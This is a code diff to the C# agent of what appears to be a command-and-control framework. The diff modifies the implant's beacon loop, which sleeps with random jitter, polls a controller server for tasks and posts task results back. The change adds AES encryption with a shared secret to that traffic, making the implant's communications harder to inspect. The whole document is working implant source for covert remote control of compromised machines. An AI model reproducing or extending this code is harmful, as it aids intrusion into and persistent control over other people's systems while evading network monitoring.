@@ -17,6 +17,7 @@ using System.Threading.Tasks;
 using Agent.Core.Utils;
 using System.Security.Cryptography;
 using Agent.Core.Utils.Encryption;
+using System.Text.Json.Serialization;
 
 // #if TYPE_http
 AgentInformationService agentInformationService = new AgentInformationService();
@@ -115,17 +116,27 @@ while (true)
             if (rnd.Next(2) == 0) { realJitter = -realJitter; }
             Thread.Sleep((delay + realJitter) * 1000);
 
-            var taskRequest = new C2Request { Reason = C2RequestReason.Task, AgentId = baseCommunicationService.BaseConfig.AgentId, AgentStatus = AgentStatus.Active };
-            var result = await baseCommunicationService.SimplePostAsync($"/", JsonSerializer.Serialize(taskRequest));
+            var taskRequest = new C2Request 
+            { 
+                Reason = C2RequestReason.Task, 
+                AgentId = baseCommunicationService.BaseConfig.AgentId, 
+                AgentStatus = AgentStatus.Active 
+            };
+
+            var encryptedTaskRequest = aesEncryptionDecorator.Transform(JsonSerializer.Serialize(taskRequest), Convert.ToBase64String(sharedSecret));
+            var result = await baseCommunicationService.SimplePostAsync($"/", encryptedTaskRequest);
 
             if (!string.IsNullOrWhiteSpace(result))
             {
-                var taskResponse = JsonSerializer.Deserialize<C2Request>(result);
+                var decodedResult = JsonSerializer.Deserialize<EncryptedRequest>(result);
+                var decryptedTaskResponse = aesDecryptionDecorator.Transform(decodedResult.Message, Convert.ToBase64String(sharedSecret));
+
+                var taskResponse = JsonSerializer.Deserialize<C2Request>(decryptedTaskResponse);
                 if (taskResponse is null) continue;
+
                 //var decryptedResult = xorDecryptionBase64DecodingDecorator.Transform(taskResponse.Message);
                 var tasks = JsonSerializer.Deserialize<List<AgentTask>>(taskResponse.Message);
                 if (tasks is null || tasks.Count == 0) continue;
-
 
                 foreach (var task in tasks)
                 {
@@ -223,7 +234,9 @@ while (true)
                         Message = JsonSerializer.Serialize(agentTask)
                     };
 
-                    await baseCommunicationService.SimplePostAsync("/", JsonSerializer.Serialize(taskUpdateRequest));
+                    var encryptedTaskUpdateRequest = aesEncryptionDecorator.Transform(JsonSerializer.Serialize(taskUpdateRequest), Convert.ToBase64String(sharedSecret));
+                    
+                    await baseCommunicationService.SimplePostAsync("/", encryptedTaskUpdateRequest);
                 }
             }
             else
